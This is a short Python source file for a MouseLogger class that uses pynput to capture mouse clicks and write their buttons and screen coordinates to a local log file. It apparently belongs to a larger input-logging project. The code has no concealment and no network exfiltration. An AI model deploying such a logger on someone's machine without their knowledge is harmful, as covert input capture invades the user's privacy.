from pynput import mouse
from InputLogger import InputLogger

class MouseLogger(InputLogger):
    def __init__(self, time_interval):
        super().__init__(time_interval)
        self.log += "=====MouseLogger Started====="
    
    def on_move(self, x, y):
        pass

    def on_scroll(self, x, y, dx, dy):
        pass

    def on_click(self, x, y, button, pressed):
        if(pressed == False): 
            return
        log = str(button) + " pressed at " + "({},{})".format(x,y)
        self.add_log(log)
   
    def run(self):
        self.save_log('mouse_log.txt')
        mouse_listener = mouse.Listener(
        on_move=self.on_move,
        on_click=self.on_click,
        on_scroll=self.on_scroll)
        
        with mouse_listener:
            mouse_listener.join()
